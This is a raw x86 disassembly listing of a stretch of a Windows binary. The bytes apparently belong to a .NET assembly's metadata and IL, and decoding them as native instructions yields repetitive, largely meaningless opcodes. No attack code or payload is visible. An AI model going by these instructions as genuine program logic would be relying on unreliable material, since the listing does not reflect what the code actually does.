  402672:	add    ch,BYTE PTR [eax]
  402674:	add    BYTE PTR cs:[eax],al
  402677:	or     al,BYTE PTR [edx]
  402679:	jnp    0x402680
  40267b:	add    BYTE PTR [eax],al
  40267d:	add    al,0x6f
  40267f:	das    
  402680:	add    BYTE PTR [eax],al
  402682:	or     al,BYTE PTR [edx]
  402684:	sub    BYTE PTR [esi],ch
  402686:	add    BYTE PTR [eax],al
  402688:	or     al,BYTE PTR [edx]
  40268a:	jnp    0x402690
  40268c:	add    BYTE PTR [eax],al
  40268e:	add    al,0x6f
  402690:	das    
  402691:	add    BYTE PTR [eax],al
  402693:	or     al,BYTE PTR [edx]
  402695:	sub    BYTE PTR [esi],ch
  402697:	add    BYTE PTR [eax],al
  402699:	or     al,BYTE PTR [edx]
  40269b:	jnp    0x40269f
  40269d:	add    BYTE PTR [eax],al
  40269f:	add    al,0x6f
  4026a1:	das    
  4026a2:	add    BYTE PTR [eax],al
  4026a4:	or     al,BYTE PTR [edx]
  4026a6:	pop    ss
  4026a7:	sub    BYTE PTR [edi+0x0],al
  4026aa:	add    BYTE PTR [edx],cl
  4026ac:	add    al,BYTE PTR [esi]
  4026ae:	jb     0x4026a7
  4026b0:	add    al,0x0
  4026b2:	jo     0x402723
  4026b4:	dec    eax
  4026b5:	add    BYTE PTR [eax],al
  4026b7:	or     dh,BYTE PTR [esp+eax*2+0x0]
  4026bb:	add    BYTE PTR [ecx],al
  4026bd:	sub    BYTE PTR [ecx+0x0],cl
  4026c0:	add    BYTE PTR [edx],cl
  4026c2:	add    dl,BYTE PTR [esi]
  4026c4:	sub    BYTE PTR [edx+0x0],cl
  4026c7:	add    BYTE PTR [edx],cl
  4026c9:	add    dl,BYTE PTR [esi]
  4026cb:	sub    BYTE PTR [ebx+0x0],cl
  4026ce:	add    BYTE PTR [edx],cl
  4026d0:	add    dh,BYTE PTR [edx+0xd]
  4026d3:	add    eax,0x32287000
  4026d8:	add    BYTE PTR [eax],al
  4026da:	or     al,BYTE PTR [edx]
  4026dc:	pop    ss
  4026dd:	sub    BYTE PTR [eax+eax*1+0x0],cl
  4026e1:	or     al,BYTE PTR [edx]
  4026e3:	jb     0x40269d
  4026e5:	add    DWORD PTR [eax],eax
  4026e7:	jo     0x402758
  4026e9:	aaa    
  4026ea:	add    BYTE PTR [eax],al
  4026ec:	or     al,BYTE PTR [edx]
  4026ee:	add    bh,dh
  4026f0:	push   es
  4026f1:	pop    es
  4026f2:	add    BYTE PTR [eax],al
  4026f4:	push   es
  4026f5:	jae    0x402731
  4026f7:	add    BYTE PTR [eax],al
  4026f9:	or     ch,BYTE PTR [eax]
  4026fb:	dec    ebp
  4026fc:	add    BYTE PTR [eax],al
  4026fe:	or     al,BYTE PTR [edx]
  402700:	jnp    0x402704
  402702:	add    BYTE PTR [eax],al
  402704:	add    al,0x16
  402706:	outs   dx,DWORD PTR ds:[esi]
  402707:	dec    esi
  402708:	add    BYTE PTR [eax],al
  40270a:	or     al,BYTE PTR [edx]
  40270c:	jnp    0x402710
  40270e:	add    BYTE PTR [eax],al
  402710:	add    al,0x6f
  402712:	dec    edi
  402713:	add    BYTE PTR [eax],al
  402715:	or     al,BYTE PTR [edx]
  402717:	push   ss
  402718:	sub    BYTE PTR [esi+0x0],cl
  40271b:	add    BYTE PTR [edx],cl
  40271d:	sub    bl,BYTE PTR [edx+0x28]
  402720:	push   eax
  402721:	add    BYTE PTR [eax],al
  402723:	or     dl,BYTE PTR [esi]
  402725:	sub    BYTE PTR [ecx+0x0],dl
  402728:	add    BYTE PTR [edx],cl
  40272a:	jae    0x40272d
  40272c:	add    BYTE PTR [eax],al
  40272e:	push   es
  40272f:	sub    BYTE PTR [edx+0x0],dl
  402732:	add    BYTE PTR [edx],cl
  402734:	sub    al,BYTE PTR [eax]
  402736:	add    BYTE PTR [eax],al
  402738:	adc    esi,DWORD PTR [eax]
  40273a:	add    al,BYTE PTR [eax]
  40273c:	cmp    BYTE PTR [ecx],al
  40273e:	add    BYTE PTR [eax],al
  402740:	add    al,0x0
  402742:	add    BYTE PTR [ecx],dl
  402744:	add    ch,BYTE PTR [eax]
  402746:	push   ebx
  402747:	add    BYTE PTR [eax],al
  402749:	or     dh,BYTE PTR [ebx+0x54]
  40274c:	add    BYTE PTR [eax],al
  40274e:	or     ah,BYTE PTR [esi]
  402750:	add    al,BYTE PTR [ebx]
  402752:	jae    0x4027a9
  402754:	add    BYTE PTR [eax],al
  402756:	or     bh,BYTE PTR [ebp+0x8]
  402759:	add    BYTE PTR [eax],al
  40275b:	add    al,0x73
  40275d:	sbb    BYTE PTR [eax],al
  40275f:	add    BYTE PTR [esi],al
  402761:	or     al,BYTE PTR [edx]
  402763:	push   es
  402764:	jge    0x40276f
  402766:	add    BYTE PTR [eax],al
  402768:	add    al,0x73
  40276a:	sbb    BYTE PTR [eax],al
  40276c:	add    BYTE PTR [esi],al
  40276e:	or     al,BYTE PTR [edx]
  402770:	jnp    0x40277b
  402772:	add    BYTE PTR [eax],al
  402774:	add    al,0x73
  402776:	push   esi
  402777:	add    BYTE PTR [eax],al
  402779:	or     bh,BYTE PTR [ebp+0x10]
  40277c:	add    BYTE PTR [eax],al
  40277e:	add    al,0x2
  402780:	jnp    0x40278b
  402782:	add    BYTE PTR [eax],al
  402784:	add    al,0x7b
  402786:	adc    BYTE PTR [eax],al
  402788:	add    BYTE PTR [esi+eax*1],al
  40278b:	outs   dx,DWORD PTR ds:[esi]
  40278c:	push   edi
  40278d:	add    BYTE PTR [eax],al
  40278f:	or     bh,BYTE PTR [eax]
  402791:	(bad)  
  402792:	add    BYTE PTR [eax],al
  402794:	add    BYTE PTR [edx],al
  402796:	sub    BYTE PTR [edi],cl
  402798:	add    BYTE PTR [eax],al
  40279a:	push   es
  40279b:	add    ch,BYTE PTR [eax]
  40279d:	or     eax,0xb060000
  4027a2:	pop    es
  4027a3:	jb     0x4027c4
  4027a5:	add    eax,0x58287000
  4027aa:	add    BYTE PTR [eax],al
  4027ac:	or     bh,BYTE PTR [edx]
  4027ae:	leave  
  4027af:	add    BYTE PTR [eax],al
  4027b1:	add    BYTE PTR [edi],al
  4027b3:	jb     0x4027d6
  4027b5:	add    eax,0x58287000
  4027ba:	add    BYTE PTR [eax],al
  4027bc:	or     ch,BYTE PTR [eax+esi*1]
  4027bf:	jae    0x4027d9
  4027c1:	add    BYTE PTR [eax],al
  4027c3:	push   es
  4027c4:	or     al,0x8
  4027c6:	push   es
  4027c7:	jge    0x4027d6
  4027c9:	add    BYTE PTR [eax],al
  4027cb:	add    al,0x6
  4027cd:	jnp    0x4027df
  4027cf:	add    BYTE PTR [eax],al
  4027d1:	add    al,0x2d
  4027d3:	or     eax,DWORD PTR [esi]
  4027d5:	jae    0x40282d
  4027d7:	add    BYTE PTR [eax],al
  4027d9:	or     bh,BYTE PTR [ebp+0x10]
  4027dc:	add    BYTE PTR [eax],al
  4027de:	add    al,0x6
  4027e0:	jnp    0x4027f2
  4027e2:	add    BYTE PTR [eax],al
  4027e4:	add    al,0x8
  4027e6:	outs   dx,DWORD PTR ds:[esi]
  4027e7:	push   edi
  4027e8:	add    BYTE PTR [eax],al
  4027ea:	or     cl,BYTE PTR [eax]
  4027ec:	or     ch,BYTE PTR [ebx]
  4027ee:	jl     0x4027f7
  4027f0:	jb     0x402817
  4027f2:	add    eax,0x58287000
  4027f7:	add    BYTE PTR [eax],al
  4027f9:	or     ch,BYTE PTR [ecx+ecx*1]
  4027fc:	push   es
  4027fd:	jnp    0x40280c
  4027ff:	add    BYTE PTR [eax],al
  402801:	add    al,0xa
  402803:	sub    esp,DWORD PTR [esi+0x6]
  402806:	jnp    0x402816
  402808:	add    BYTE PTR [eax],al
  40280a:	add    al,0x2d
  40280c:	or     DWORD PTR [esi],eax
  40280e:	pop    es
  40280f:	jge    0x40281f
  402811:	add    BYTE PTR [eax],al
  402813:	add    al,0x2b
  402815:	push   ebp
  402816:	push   es
  402817:	jnp    0x402828
  402819:	add    BYTE PTR [eax],al
  40281b:	add    al,0x2d
  40281d:	sbb    BYTE PTR [esi],al
  40281f:	jnp    0x402831
  402821:	add    BYTE PTR [eax],al
  402823:	add    al,0x2d
  402825:	adc    BYTE PTR [esi],al
  402827:	pop    es
  402828:	jge    0x402839
  40282a:	add    BYTE PTR [eax],al
  40282c:	add    al,0x6
  40282e:	jnp    0x40283d
  402830:	add    BYTE PTR [eax],al
  402832:	add    al,0xa
  402834:	sub    esi,DWORD PTR ds:0x1873
  40283a:	push   es
  40283b:	or     eax,0xe7d0709
  402840:	add    BYTE PTR [eax],al
  402842:	add    al,0x9
  402844:	push   es
  402845:	jge    0x402854
  402847:	add    BYTE PTR [eax],al
  402849:	add    al,0x6
  40284b:	jnp    0x40285d
  40284d:	add    BYTE PTR [eax],al
  40284f:	add    al,0x2d
  402851:	or     eax,DWORD PTR [esi]
  402853:	jae    0x4028ab
  402855:	add    BYTE PTR [eax],al
  402857:	or     bh,BYTE PTR [ebp+0x10]
  40285a:	add    BYTE PTR [eax],al
  40285c:	add    al,0x6
  40285e:	jnp    0x402870
  402860:	add    BYTE PTR [eax],al
  402862:	add    al,0x9
  402864:	outs   dx,DWORD PTR ds:[esi]
  402865:	push   edi
  402866:	add    BYTE PTR [eax],al
  402868:	or     cl,BYTE PTR [ecx]
  40286a:	or     al,BYTE PTR [edx]
  40286c:	jnp    0x402876
  40286e:	add    BYTE PTR [eax],al
  402870:	add    al,0x6f
  402872:	pop    ecx
  402873:	add    BYTE PTR [eax],al
  402875:	or     bh,BYTE PTR [ecx]
  402877:	sbb    bh,bh
  402879:	(bad)  
  40287a:	jmp    FWORD PTR [edx]
  40287c:	adc    esi,DWORD PTR [eax]
  40287e:	add    eax,0x9f00
  402883:	add    BYTE PTR ds:0x72110000,al
  402889:	pop    ds
  40288a:	add    eax,0x160a7000
  40288f:	or     edx,DWORD PTR [esi]
  402891:	or     al,0x2b
  402893:	pop    ebp
  402894:	add    bh,BYTE PTR [ebx+0x8]
  402897:	add    BYTE PTR [eax],al
  402899:	add    al,0x6f
  40289b:	pop    edx
  40289c:	add    BYTE PTR [eax],al
  40289e:	or     dl,cl
  4028a0:	or     eax,0x61d2c07
  4028a5:	adc    al,BYTE PTR [ebx]
  4028a7:	(bad)  
  4028a8:	push   ss
  4028a9:	dec    eax
  4028aa:	add    BYTE PTR [eax],al
  4028ac:	add    DWORD PTR [edi+0x24],ebp
  4028af:	add    BYTE PTR [eax],al
  4028b1:	or     ch,BYTE PTR [eax]
  4028b3:	and    eax,0xa0a0000
  4028b8:	or     DWORD PTR [edi],ebx
  4028ba:	and    dh,BYTE PTR [ebx]
  4028bc:	sub    BYTE PTR [edi],dl
  4028be:	or     al,0x2b
  4028c0:	and    al,0x2
  4028c2:	or     DWORD PTR [eax],ebp
  4028c4:	push   cs
  4028c5:	add    BYTE PTR [eax],al
  4028c7:	push   es
  4028c8:	sub    eax,0x3120637
  4028cd:	(bad)  
  4028ce:	push   ss
  4028cf:	dec    eax
  4028d0:	add    BYTE PTR [eax],al
  4028d2:	add    DWORD PTR [edi+0x24],ebp
  4028d5:	add    BYTE PTR [eax],al
  4028d7:	or     ch,BYTE PTR [eax]
  4028d9:	and    eax,0xa0a0000
  4028de:	or     DWORD PTR [edi],ebx
  4028e0:	and    dh,BYTE PTR [ebx]
  4028e2:	add    dl,BYTE PTR [edi]
  4028e4:	or     eax,DWORD PTR [edx]
  4028e6:	jnp    0x4028f0
  4028e8:	add    BYTE PTR [eax],al
  4028ea:	add    al,0x6f
  4028ec:	pop    ebx
  4028ed:	add    BYTE PTR [eax],al
  4028ef:	or     ah,BYTE PTR [esi]
  4028f1:	add    bh,BYTE PTR [ebx+0x8]
  4028f4:	add    BYTE PTR [eax],al
  4028f6:	add    al,0x6f
  4028f8:	pop    ecx
  4028f9:	add    BYTE PTR [eax],al
  4028fb:	or     ch,BYTE PTR ds:0x932c0803
  402901:	push   es
  402902:	pop    ss
  402903:	lea    ecx,[eax+0x0]
  402906:	add    BYTE PTR [ecx],al
  402908:	and    eax,0x9d221f16
  40290d:	outs   dx,DWORD PTR ds:[esi]
  40290e:	pop    esp
  40290f:	add    BYTE PTR [eax],al
  402911:	or     cl,BYTE PTR [edx]
  402913:	push   es
  402914:	pop    ss
  402915:	lea    ecx,[eax+0x0]
  402918:	add    BYTE PTR [ecx],al
  40291a:	and    eax,0x9d221f16
  40291f:	outs   dx,DWORD PTR ds:[esi]
  402920:	pop    ebp
  402921:	add    BYTE PTR [eax],al
  402923:	or     cl,BYTE PTR [edx]
  402925:	push   es
  402926:	sub    ah,BYTE PTR [edx+0x3]
  402929:	pop    ds
  40292a:	and    BYTE PTR [esi],ch
  40292c:	lsl    ebx,WORD PTR [edi]
  40292f:	or     ch,BYTE PTR [esi]
  402931:	or     al,BYTE PTR [ebx]
  402933:	pop    ds
  402934:	or     eax,0x1f03052e
  402939:	or     DWORD PTR [ebx],esi
  40293b:	add    dl,BYTE PTR [edi]
  40293d:	sub    dl,BYTE PTR [esi]
  40293f:	sub    al,dl
  402941:	sub    esp,DWORD PTR [eax]
  402943:	add    al,BYTE PTR [edx]
  402945:	jnp    0x40294f
  402947:	add    BYTE PTR [eax],al
  402949:	add    al,0x6f
  40294b:	pop    edx
  40294c:	add    BYTE PTR [eax],al
  40294e:	or     dl,cl
  402950:	sub    BYTE PTR [esi],cl
  402952:	add    BYTE PTR [eax],al
  402954:	push   es
  402955:	sub    al,0x19
  402957:	add    bh,BYTE PTR [ebx+0x8]
  40295a:	add    BYTE PTR [eax],al
  40295c:	add    al,0x6f
  40295e:	pop    ebx
  40295f:	add    BYTE PTR [eax],al
  402961:	or     ah,BYTE PTR [esi]
  402963:	add    bh,BYTE PTR [ebx+0x8]
  402966:	add    BYTE PTR [eax],al
  402968:	add    al,0x6f
  40296a:	pop    ecx
  40296b:	add    BYTE PTR [eax],al
  40296d:	or     ch,BYTE PTR [ebx+edx*8]
  402970:	sub    al,BYTE PTR [eax]
  402972:	add    BYTE PTR [eax],al
  402974:	sbb    esi,DWORD PTR [eax]
  402976:	add    eax,0xa700
  40297b:	add    BYTE PTR [esi],al
  40297d:	add    BYTE PTR [eax],al
  40297f:	adc    DWORD PTR [ebx],eax
  402981:	pop    ss
  402982:	lea    ecx,[eax+0x0]
  402985:	add    BYTE PTR [ecx],al
  402987:	and    eax,0x9d2f1f16
  40298c:	outs   dx,DWORD PTR ds:[esi]
  40298d:	pop    esi
  40298e:	add    BYTE PTR [eax],al
  402990:	or     cl,BYTE PTR [edx]
  402992:	fimul  WORD PTR [esi]
  402994:	es pop ss
  402996:	lea    ebp,[ecx]
  402998:	add    BYTE PTR [eax],al
  40299a:	add    DWORD PTR ds:0xaa20316,esp
  4029a0:	fiadd  WORD PTR [eax]
  4029a2:	add    bh,BYTE PTR [ebx+0x9]
  4029a5:	add    BYTE PTR [eax],al
  4029a7:	add    al,0xb
  4029a9:	push   ss
  4029aa:	or     al,0x2b
  4029ac:	ins    BYTE PTR es:[edi],dx
  4029ad:	pop    es
  4029ae:	or     eax,0x107b07
  4029b3:	add    BYTE PTR [edi+ebp*2],al
  4029b6:	pop    edi
  4029b7:	add    BYTE PTR [eax],al
  4029b9:	or     dl,BYTE PTR [ebx]
  4029bb:	add    al,0x2b
  4029bd:	cmp    dl,BYTE PTR [edx]
  4029bf:	add    al,0x28
  4029c1:	pusha  
  4029c2:	add    BYTE PTR [eax],al
  4029c4:	or     dl,BYTE PTR [ebx]
  4029c6:	add    eax,0xe7b0511
  4029cb:	add    BYTE PTR [eax],al
  4029cd:	add    al,0x6
  4029cf:	or     BYTE PTR [edx+0x5828],bl
  4029d5:	or     ch,BYTE PTR [eax+eiz*1]
  4029d8:	adc    DWORD PTR ds:0x8e06080b,eax
  4029de:	imul   edx,DWORD PTR [edi],0x71e3359
  4029e4:	jnp    0x4029f5
  4029e6:	add    BYTE PTR [eax],al
  4029e8:	add    al,0x2c
  4029ea:	push   ss
  4029eb:	add    al,0x7
  4029ed:	jnp    0x4029fe
  4029ef:	add    BYTE PTR [eax],al
  4029f1:	add    al,0x51
  4029f3:	pop    ss
  4029f4:	adc    eax,DWORD PTR [esi]
  4029f6:	fisubr WORD PTR [edx+edx*1]
  4029f9:	add    al,0x28
  4029fb:	popa   
  4029fc:	add    BYTE PTR [eax],al
  4029fe:	or     ch,BYTE PTR ds:0x120edebd
  402a04:	add    al,0xfe
  402a06:	push   ss
  402a07:	add    al,BYTE PTR [eax]
  402a09:	add    BYTE PTR [ebx],bl
  402a0b:	outs   dx,DWORD PTR ds:[esi]
  402a0c:	add    BYTE PTR es:[eax],al
  402a0f:	or     bl,ah
  402a11:	pop    es
  402a12:	or     DWORD PTR [esi],ebp
  402a14:	or     cl,BYTE PTR [eax]
  402a16:	pop    ss
  402a17:	pop    eax
  402a18:	or     al,0x8
  402a1a:	push   es
  402a1b:	mov    gs,WORD PTR [ecx+0x32]
  402a1e:	mov    es,WORD PTR [esp+edx*1]
  402a21:	push   ecx
  402a22:	push   ss
  402a23:	sub    dl,BYTE PTR [ecx]
  402a25:	push   es
  402a26:	sub    al,BYTE PTR [eax]
  402a28:	add    DWORD PTR [eax+eax*1],ebx
  402a2b:	add    BYTE PTR [eax],al
  402a2d:	add    BYTE PTR [eax],al
  402a2f:	add    BYTE PTR [esp+edx*1],dl
  402a32:	add    BYTE PTR [esi],cl
  402a34:	adc    eax,0x2010000
  402a39:	add    BYTE PTR [eax+eax*1],bh
  402a3c:	inc    edi
  402a3d:	add    DWORD PTR [eax],0xe
  402a40:	add    BYTE PTR [eax],al
  402a42:	add    BYTE PTR [eax],al
  402a44:	push   ds
  402a45:	add    ch,BYTE PTR [eax]
  402a47:	push   ebx
  402a48:	add    BYTE PTR [eax],al
  402a4a:	or     ch,BYTE PTR [edx]
  402a4c:	scas   al,BYTE PTR es:[edi]
  402a4d:	jle    0x402a59
  402a4f:	add    BYTE PTR [eax],al
  402a51:	add    al,0x2d
  402a53:	push   ds
  402a54:	jb     0x402a7f
  402a56:	add    eax,0x5d07000
  402a5b:	add    BYTE PTR [eax],al
  402a5d:	add    ch,BYTE PTR [eax]
  402a5f:	sub    BYTE PTR [eax],al
  402a61:	add    BYTE PTR [edx],cl
  402a63:	outs   dx,DWORD PTR ds:[esi]
  402a64:	bound  eax,QWORD PTR [eax]
  402a66:	add    BYTE PTR [edx],cl
  402a68:	jae    0x402acd
  402a6a:	add    BYTE PTR [eax],al
  402a6c:	or     al,BYTE PTR [eax+0x400000a]
  402a72:	jle    0x402a7e
  402a74:	add    BYTE PTR [eax],al
  402a76:	add    al,0x2a
  402a78:	sbb    bh,BYTE PTR [esi+0xb]
  402a7b:	add    BYTE PTR [eax],al
  402a7d:	add    al,0x2a
  402a7f:	push   ds
  402a80:	add    al,BYTE PTR [eax+0x400000b]
  402a86:	sub    bl,BYTE PTR [edx]
  402a88:	jle    0x402a96
  402a8a:	add    BYTE PTR [eax],al
  402a8c:	add    al,0x2a
  402a8e:	push   ds
  402a8f:	add    ch,BYTE PTR [eax]
  402a91:	add    BYTE PTR fs:[eax],al
  402a94:	or     ch,BYTE PTR [edx]
  402a96:	push   esi
  402a97:	jae    0x402aaf
  402a99:	add    BYTE PTR [eax],al
  402a9b:	push   es
  402a9c:	sub    BYTE PTR [ebp+0x0],ah
  402a9f:	add    BYTE PTR [edx],cl
  402aa1:	je     0x402aa9
  402aa3:	add    BYTE PTR [eax],al
  402aa5:	add    al,BYTE PTR [eax+0x400000c]
  402aab:	sub    al,BYTE PTR [edx+0x53]
  402aae:	dec    edx
  402aaf:	inc    edx
  402ab0:	add    DWORD PTR [eax],eax
  402ab2:	add    DWORD PTR [eax],eax
  402ab4:	add    BYTE PTR [eax],al
  402ab6:	add    BYTE PTR [eax],al
  402ab8:	or     al,0x0
  402aba:	add    BYTE PTR [eax],al
  402abc:	jbe    0x402af2
  402abe:	xor    BYTE PTR cs:[esi],ch
  402ac1:	xor    esi,DWORD PTR [eax]
  402ac3:	xor    esi,DWORD PTR [ecx]
  402ac5:	cmp    DWORD PTR [eax],eax
  402ac7:	add    BYTE PTR [eax],al
  402ac9:	add    BYTE PTR ds:0x6c00,al
  402acf:	add    BYTE PTR [eax+0x8],cl
  402ad2:	add    BYTE PTR [eax],al
  402ad4:	and    edi,DWORD PTR [esi+0x0]
  402ad7:	add    BYTE PTR [eax+ecx*1+0xad80000],dh
  402ade:	add    BYTE PTR [eax],al
  402ae0:	and    edx,DWORD PTR [ebx+0x74]
  402ae3:	jb     0x402b4e
  402ae5:	outs   dx,BYTE PTR ds:[esi]
  402ae6:	addr16 jae 0x402ae9
  402ae9:	add    BYTE PTR [eax],al
  402aeb:	add    BYTE PTR [ebx+edx*1+0x5640000],cl
  402af2:	add    BYTE PTR [eax],al
  402af4:	and    edx,DWORD PTR [ebp+0x53]
  402af7:	add    al,dh
  402af9:	sbb    BYTE PTR [eax],al
  402afb:	add    BYTE PTR [eax],dl
  402afd:	add    BYTE PTR [eax],al
  402aff:	add    BYTE PTR [ebx],ah
  402b01:	inc    edi
  402b02:	push   ebp
  402b03:	dec    ecx
  402b04:	inc    esp
  402b05:	add    BYTE PTR [eax],al
  402b07:	add    BYTE PTR [eax],al
  402b09:	sbb    DWORD PTR [eax],eax
  402b0b:	add    al,bl
  402b0d:	add    eax,DWORD PTR [eax]
  402b0f:	add    BYTE PTR [ebx],ah
  402b11:	inc    edx
  402b12:	ins    BYTE PTR es:[edi],dx
  402b13:	outs   dx,DWORD PTR ds:[esi]
  402b14:	bound  eax,QWORD PTR [eax]
  402b16:	add    BYTE PTR [eax],al
  402b18:	add    BYTE PTR [eax],al
  402b1a:	add    BYTE PTR [eax],al
  402b1c:	add    al,BYTE PTR [eax]
  402b1e:	add    BYTE PTR [ecx],al
  402b20:	push   edi
  402b21:	adc    eax,0x30909a2
  402b26:	add    BYTE PTR [eax],al
  402b28:	add    dl,bh
  402b2a:	add    DWORD PTR [ebx],esi
  402b2c:	add    BYTE PTR [esi],dl
  402b2e:	add    BYTE PTR [eax],al
  402b30:	add    DWORD PTR [eax],eax
  402b32:	add    BYTE PTR [eax],al
  402b34:	dec    edx
  402b35:	add    BYTE PTR [eax],al
  402b37:	add    BYTE PTR [edi],al
  402b39:	add    BYTE PTR [eax],al
  402b3b:	add    BYTE PTR [eax],dl
  402b3d:	add    BYTE PTR [eax],al
  402b3f:	add    BYTE PTR [eax],bl
  402b41:	add    BYTE PTR [eax],al
  402b43:	add    BYTE PTR [edx],dl
  402b45:	add    BYTE PTR [eax],al
  402b47:	add    BYTE PTR [ebp+0x0],ah
  402b4a:	add    BYTE PTR [eax],al
  402b4c:	push   ss
  402b4d:	add    BYTE PTR [eax],al
  402b4f:	add    BYTE PTR [esi],al
  402b51:	add    BYTE PTR [eax],al
  402b53:	add    BYTE PTR [edx],al
  402b55:	add    BYTE PTR [eax],al
  402b57:	add    BYTE PTR [ebx],al
  402b59:	add    BYTE PTR [eax],al
  402b5b:	add    BYTE PTR [eax+eax*1],al
  402b5e:	add    BYTE PTR [eax],al
  402b60:	add    al,BYTE PTR [eax]
  402b62:	add    BYTE PTR [eax],al
  402b64:	add    DWORD PTR [eax],eax
  402b66:	add    BYTE PTR [eax],al
  402b68:	add    al,0x0
  402b6a:	add    BYTE PTR [eax],al
  402b6c:	add    al,BYTE PTR [eax]
  402b6e:	add    BYTE PTR [eax],al
  402b70:	add    DWORD PTR [eax],eax
  402b72:	add    BYTE PTR [eax],al
  402b74:	add    BYTE PTR [eax],al
  402b76:	fs add al,0x1
  402b79:	add    BYTE PTR [eax],al
  402b7b:	add    BYTE PTR [eax],al
  402b7d:	add    BYTE PTR [esi],al
  402b7f:	add    dl,cl
  402b81:	add    esp,ebp
  402b83:	pop    es
  402b84:	push   es
  402b85:	add    BYTE PTR [edi],dh
  402b87:	add    al,0xe5
  402b89:	pop    es
  402b8a:	push   es
  402b8b:	add    ch,ah
  402b8d:	add    dh,BYTE PTR [ebx+0x56000f07]
  402b93:	or     BYTE PTR [eax],al
  402b95:	add    BYTE PTR [esi],al
  402b97:	add    BYTE PTR [esi],ah
  402b99:	add    edi,ebx
  402b9b:	add    eax,0x3ad0006
  402ba0:	sti    
  402ba1:	add    eax,0x38e0006
  402ba6:	sti    
  402ba7:	add    eax,0x41e0006
  402bac:	sti    
  402bad:	add    eax,0x3ea0006
  402bb2:	sti    
  402bb3:	add    eax,0x4030006
  402bb8:	sti    
  402bb9:	add    eax,0x33d0006
  402bbe:	sti    
  402bbf:	add    eax,0x3120006
  402bc4:	mov    BYTE PTR [edi],0x6
  402bc7:	add    BYTE PTR [ebx+0x607c602],ah
  402bcd:	add    BYTE PTR [ecx+0x3],dh
  402bd0:	sti    
  402bd1:	add    eax,0x3580006
  402bd6:	xchg   esp,eax
  402bd7:	add    al,0xa
  402bd9:	add    BYTE PTR [ebx+0x5],dh
  402bdc:	test   DWORD PTR [eax],0x743000e
  402be2:	push   ds
  402be3:	add    eax,0xa80000a
  402be8:	test   DWORD PTR [eax],0xa77000a
  402bee:	test   DWORD PTR [eax],0x679000a
  402bf4:	test   DWORD PTR [eax],0x95a0006
  402bfa:	ins    BYTE PTR es:[edi],dx
  402bfb:	add    eax,0x8e00006
  402c00:	ins    BYTE PTR es:[edi],dx
  402c01:	add    eax,0xa940006
  402c06:	adc    al,BYTE PTR [eax]
  402c08:	push   es
  402c09:	add    BYTE PTR [ebx+0x6],al
  402c0c:	ins    BYTE PTR es:[edi],dx
  402c0d:	add    eax,0x705000e
  402c12:	push   ds
  402c13:	add    eax,0x2750006
  402c18:	ins    BYTE PTR es:[edi],dx
  402c19:	add    eax,0x6af0006
  402c1e:	xor    DWORD PTR [eax],eax
  402c20:	push   es
  402c21:	add    BYTE PTR [ecx],al
  402c23:	add    BYTE PTR [eax+eax*1+0x73],al
  402c27:	add    BYTE PTR [ebx+0xe000007],bl
  402c2d:	add    BYTE PTR [ecx+0x6072b02],dh
  402c33:	add    al,cl
  402c35:	add    dh,BYTE PTR [ebx-0x77fff9f9]
  402c3b:	add    ah,ch
  402c3d:	pop    es
  402c3e:	push   es
  402c3f:	add    BYTE PTR [esi],cl
  402c41:	pop    es
  402c42:	add    eax,0x84000608
  402c47:	push   es
  402c48:	out    0x5,al
  402c4a:	push   cs
  402c4b:	add    BYTE PTR [ecx+0x2],dl
  402c4e:	push   ds
  402c4f:	add    eax,0x2f9000e
  402c54:	push   ds
  402c55:	add    eax,0x225000e
  402c5a:	rol    DWORD PTR ds:0x5b8000a,1
  402c60:	test   DWORD PTR [eax],0x54c000a
  402c66:	test   DWORD PTR [eax],0x1be0006
  402c6c:	xor    DWORD PTR [eax],eax
  402c6e:	push   es
  402c6f:	add    BYTE PTR [eax+0x6056c04],dh
  402c75:	add    BYTE PTR [ebx-0x54fa93f7],ch
  402c7b:	add    ah,bl
  402c7d:	push   es
  402c7e:	add    BYTE PTR [eax],al
  402c80:	push   es
  402c81:	add    ch,ah
  402c83:	add    al,0x31
  402c85:	add    BYTE PTR [esi],al
  402c87:	add    BYTE PTR [edi+0x600310a],dh
  402c8d:	add    BYTE PTR [eax+0xa003106],dl
  402c93:	add    BYTE PTR [edx+ecx*1-0x9],cl
  402c97:	or     BYTE PTR [edx],cl
  402c99:	add    BYTE PTR [esi+0xa08f709],bl
  402c9f:	add    BYTE PTR [ecx+ecx*1],ah
  402ca2:	test   DWORD PTR [eax],0x5a9000a
  402ca8:	test   DWORD PTR [eax],0x936000e
  402cae:	mov    bl,0x7
  402cb0:	push   es
  402cb1:	add    cl,al
  402cb3:	or     dl,BYTE PTR [edx]
  402cb5:	add    BYTE PTR [esi],al
  402cb7:	add    BYTE PTR [esi+0x1],dh
  402cba:	ins    BYTE PTR es:[edi],dx
  402cbb:	add    eax,0x1ed0006
  402cc0:	ins    BYTE PTR es:[edi],dx
  402cc1:	add    eax,0x19a0006
  402cc6:	ins    BYTE PTR es:[edi],dx
  402cc7:	add    eax,0x60d009f
  402ccc:	add    BYTE PTR [eax],al
  402cce:	adc    al,BYTE PTR [eax]
  402cd0:	fimul  WORD PTR [ecx]
  402cd2:	rol    DWORD PTR [edx+edx*1],0x0
  402cd6:	pop    DWORD PTR [ecx+eax*8]
  402cd9:	add    al,0xa
  402cdb:	add    BYTE PTR [edx],bl
  402cdd:	add    dh,bh
  402cdf:	or     BYTE PTR [esi],al
  402ce1:	add    BYTE PTR [esi],bl
  402ce3:	pop    es
  402ce4:	ins    BYTE PTR es:[edi],dx
  402ce5:	add    eax,0x26a000a
  402cea:	test   DWORD PTR [eax],0x89b000a
  402cf0:	test   DWORD PTR [eax],0x534000a
  402cf6:	test   DWORD PTR [eax],0x2b0012
  402cfc:	rol    DWORD PTR [edx+ecx*1],0x0
  402d00:	inc    ebx
  402d01:	add    eax,0xa08f7
  402d06:	arpl   WORD PTR [ecx],ax
  402d08:	test   DWORD PTR [eax],0x1c7000a
  402d0e:	test   DWORD PTR [eax],0x5b30012
  402d14:	rol    DWORD PTR [edx+ecx*1],0x0
  402d18:	xor    DWORD PTR [esi],eax
  402d1a:	test   DWORD PTR [eax],0x6ce0006
  402d20:	and    eax,0xbc00060a
  402d25:	push   es
  402d26:	xor    DWORD PTR [eax],eax
  402d28:	push   es
  402d29:	add    BYTE PTR [edx+0x6056c06],ch
  402d2f:	add    BYTE PTR [eax+0xe05fb0a],ch
  402d35:	add    BYTE PTR [eax],dh
  402d37:	add    dl,cl
  402d39:	add    eax,0x0
  402d3e:	and    al,BYTE PTR [eax]
  402d40:	add    BYTE PTR [eax],al
  402d42:	add    BYTE PTR [eax],al
  402d44:	add    DWORD PTR [eax],eax
  402d46:	add    DWORD PTR [eax],eax
  402d48:	add    DWORD PTR [eax],eax
